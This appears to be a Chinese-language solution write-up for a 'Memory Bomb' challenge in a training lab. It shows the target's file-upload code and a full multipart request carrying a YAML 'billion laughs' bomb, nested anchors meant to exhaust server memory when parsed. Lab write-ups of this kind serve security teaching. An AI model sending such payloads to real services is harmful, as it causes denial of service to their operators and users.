---
title: Memory Bomb
description: 各种文件类型都有其特殊用法，搜索获得更多信息，如 “XX炸弹/十亿笑” 对应各种文件类型
---

- 描述：将一些爆炸性数据投入一个易受攻击的文件处理端点。
- 查看示例解决方案，此处使用 yaml 格式的文件
    - 在 ```main.js``` 中对上传文件代码为
        ```javascript
        uploader = new bt.l0({
            url: x.c.hostServer + "/file-upload",
            authToken: `Bearer ${localStorage.getItem("token")}`,
            allowedMimeType: ["application/pdf", "application/xml", "text/xml", "application/zip", "application/x-zip-compressed", "multipart/x-zip", "application/yaml", "application/x-yaml", "text/yaml", "text/x-yaml"],
            maxFileSize: 1e5
        });
        ```
    - 使用 yaml 格式文件的 yaml 炸弹 https://github.com/dubniczky/Yaml-Bomb
        ```
        Content-Disposition: form-data; name="file"; filename="test.yaml"
        Content-Type: application/octet-stream

        a: &a [_,_,_,_,_,_,_,_,_,_,_,_,_,_,_]
        b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a,*a]
        c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b,*b]
        d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c,*c]
        e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d,*d]
        f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e,*e]
        g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f,*f]
        h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g,*g]
        i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h,*h]
        ```